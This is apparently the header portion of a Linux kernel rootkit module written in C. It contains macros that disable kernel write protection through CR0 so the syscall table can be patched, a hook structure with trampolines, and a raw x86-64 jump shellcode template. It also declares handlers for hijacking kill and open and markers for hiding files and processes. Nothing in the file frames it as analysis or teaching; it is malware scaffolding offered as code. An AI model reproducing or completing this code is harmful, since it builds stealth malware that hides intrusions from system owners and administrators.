/** ~~~~~~~~~~~~~~ Imports ~~~~~~~~~~~~~~~**/
//Used by kill hook
#include <linux/sched.h>

#include <linux/version.h>
#include <linux/err.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/fs.h>
#include <linux/utsname.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/slab.h>
#include <linux/utsname.h>
#include <asm/pgtable.h>
#include <linux/vmalloc.h>

/** ~~~~~~~~~~~~ Kernel specific imports ~~~~~~~~~~~~ **/
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
	#include <linux/proc_ns.h>
#else
	#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
	#include <asm/uaccess.h>
#endif

/** ~~~~~~~~~~~~~~~ MACROS ~~~~~~~~~~~~~~~~ **/
//Allow and disallow writing to syscall
#define DISABLE_W_PROTECTED_MEMORY \
	preempt_disable(); \
	barrier(); \
	write_cr0(read_cr0() & (~ 0x00010000)); 

#define ENABLE_W_PROTECTED_MEMORY \
	write_cr0(read_cr0()); \
	barrier(); \
	preempt_enable();

//File hiding macros
#define HIDDEN 0x10000000


/** ~~~~~~~~~~~~~~ struct declerations ~~~~~~~~~~~~ **/

//Struct for each hook
struct Hook{
	unsigned int id;
	unsigned int hook_len;
	//Backup of old code so we can restore it
	unsigned char *original_code;
	//Hook to be inserted into syscall function
	unsigned char *hook;
	//Trampoline that goofy function will call at end
	unsigned char *trampoline;
	//Pointer to the original function
	unsigned char *og_func;
	//Pointer to the new function?
	unsigned char *new_func;
	//Paused or not
	unsigned char paused;
};

//Struct used by the uname syscall
struct utsname {
	char sysname[sizeof(utsname()->sysname)];    /* Operating system name (e.g., "Linux") */
	char nodename[sizeof(utsname()->nodename)];   /* Name within "some implementation-defined network" */
	char release[sizeof(utsname()->release)];    /* Operating system release (e.g., "2.6.28") */
	char version[sizeof(utsname()->version)];    /* Operating system version */
	char machine[sizeof(utsname()->machine)];    /* Hardware identifier */
#ifdef _GNU_SOURCE
	char domainname[]; /* NIS or YP domain name */
#endif
};

struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char           d_name[];  /* Filename (null-terminated) */
	/* length is actually (d_reclen - 2 -
	    offsetof(struct linux_dirent, d_name) */
	 /*
		char           pad;       // Zero padding byte
		char           d_type;    // File type (only since Linux 2.6.4;
		                          // offset is (d_reclen - 1))
								  */
};



// ~~~~~~~~~~~ Variable declerations ~~~~~~~~~~
static unsigned long *__sys_call_table;

// process hiding
int is_hidden_proc(pid_t pid);
typedef int pid_t;

// Trampoline creation
unsigned char * create_tramp(unsigned long *dst, unsigned long *src, unsigned int id, unsigned int h_len);
int HOOK_LEN = 15; // Length of the template
// Code used to jump to arbitrary addresses
//  	movabs rax,0x1122334455667788
//  	mov    rax,rax
//  	jmp    rax
unsigned char JUMP_TEMPLATE[] = "\x48\xb8\x88\x77\x66\x55\x44\x33\x22\x11\x48\x89\xc0\xff\xe0"; 
unsigned char *jump; // What gets populated by the JUMP_TEMPLATE. Instantiated with \x90 and sized by the h_len param in create_tramp function

// Easy hooking hanglers
int (*original_kill)(pid_t, int);
int (*original_open)(const char *pathname, int flags, mode_t mode);
// Not used
//int (*original_getdents)(unsigned int, struct  linux_dirent *, unsigned int);
//int (*original_getdents64)(unsigned int, struct linux_dirent *, unsigned int);
//int (*original_open)(const char *, int, mode_t);
//int (*original_uname)(struct utsname *);


struct Hook **hooks;


